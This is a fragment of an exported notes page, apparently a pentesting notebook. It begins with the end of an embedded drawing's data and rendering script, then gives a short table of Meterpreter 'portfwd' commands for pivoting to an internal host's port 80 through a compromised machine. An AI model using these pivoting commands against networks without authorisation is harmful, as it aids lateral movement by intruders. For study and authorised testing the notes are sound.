3","autoResize":true,"lineHeight":1.25}],"appState":{"theme":"dark","viewBackgroundColor":"transparent","currentItemStrokeColor":"#1e1e1e","currentItemBackgroundColor":"transparent","currentItemFillStyle":"solid","currentItemStrokeWidth":2,"currentItemStrokeStyle":"solid","currentItemRoughness":1,"currentItemOpacity":100,"currentItemFontFamily":5,"currentItemFontSize":20,"currentItemTextAlign":"left","currentItemStartArrowhead":null,"currentItemEndArrowhead":"arrow","currentItemArrowType":"round","scrollX":489,"scrollY":382.9312438964844,"zoom":{"value":1},"currentItemRoundness":"round","gridSize":20,"gridStep":5,"gridModeEnabled":false,"gridColor":{"Bold":"rgba(217, 217, 217, 0.5)","Regular":"rgba(230, 230, 230, 0.5)"},"currentStrokeOptions":null,"frameRendering":{"enabled":true,"clip":true,"name":true,"outline":true},"objectsSnapModeEnabled":false,"activeTool":{"type":"selection","customType":null,"locked":false,"lastActiveTool":null}},"files":{}};InitialData.scrollToContent=true;App=()=>{const e=React.useRef(null),t=React.useRef(null),[n,i]=React.useState({width:void 0,height:void 0});return React.useEffect(()=>{i({width:t.current.getBoundingClientRect().width,height:t.current.getBoundingClientRect().height});const e=()=>{i({width:t.current.getBoundingClientRect().width,height:t.current.getBoundingClientRect().height})};return window.addEventListener("resize",e),()=>window.removeEventListener("resize",e)},[t]),React.createElement(React.Fragment,null,React.createElement("div",{className:"excalidraw-wrapper",ref:t},React.createElement(ExcalidrawLib.Excalidraw,{ref:e,width:n.width,height:n.height,initialData:InitialData,viewModeEnabled:!0,zenModeEnabled:!0,gridModeEnabled:!1})))},excalidrawWrapper=document.getElementById("Drawing_2024-10-09_2235.56.excalidraw.md1");ReactDOM.render(React.createElement(App),excalidrawWrapper);})();</script>

| Option                                     | Desctiprion                           |
| ------------------------------------------ | ------------------------------------- |
| `portfwd add -l 33 -p 80 -r IP_machine3`   | lport 33, rport 80, rhost IP_machine3 |
| `portfwd delete -l 8080 -p 80 -r 10.0.2.3` | Delete                                |
| `portfwd list`                             | List porforwarding configs            |
Now we can access to `localhost:33` to acess the `machine3:80`

</div></div>


</div></div>

# [[Relaying\|Relaying]]

</div></div>
